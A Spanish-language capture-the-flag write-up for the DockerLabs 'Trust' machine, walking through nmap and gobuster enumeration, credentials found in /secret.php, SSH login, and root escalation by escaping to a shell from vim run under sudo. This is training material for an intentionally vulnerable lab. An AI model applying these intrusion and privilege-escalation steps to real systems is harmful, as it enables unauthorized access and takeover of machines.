# 📄 Writeup – DockerLabs: Trust

`# 🐳 DockerLabs - Trust  ## 📌 Información General - Objetivo: Escalada de privilegios - IP: 172.18.0.2 - Dificultad: Básica - Técnica principal: Reutilización de credenciales + abuso de sudo  ---  # 🔎 Fase 1 – Reconocimiento  ## Escaneo completo  ```bash nmap -sC -sV -p- 172.18.0.2`

### Puertos abiertos:

- 22 → SSH (OpenSSH)
    
- 80 → HTTP (Apache)
    

---

# 🌐 Fase 2 – Enumeración Web

## Enumeración de directorios

`gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

### Hallazgo importante:

`/secret.php`

Al acceder se encontraron credenciales:

- Usuario: mario
    
- Password: chocolate
    

---

# 🔐 Fase 3 – Acceso Inicial

Se probó reutilización de credenciales en SSH:

`ssh mario@172.18.0.2`

Password:

`chocolate`

✅ Acceso exitoso.

---

# 🔎 Fase 4 – Enumeración Interna

Verificación de privilegios sudo:

`sudo -l`

Resultado:

`(ALL) /usr/bin/vim`

El usuario `mario` puede ejecutar `vim` como root.

---

# 🚀 Fase 5 – Escalada de Privilegios

Se ejecuta:

`sudo vim`

Dentro de vim:

`:!bash`

Se obtiene shell root.

Verificación:

`whoami`

Resultado:

`root`

---

# 🏁 Acceso Root

`cd /root ls`

Root comprometido con éxito.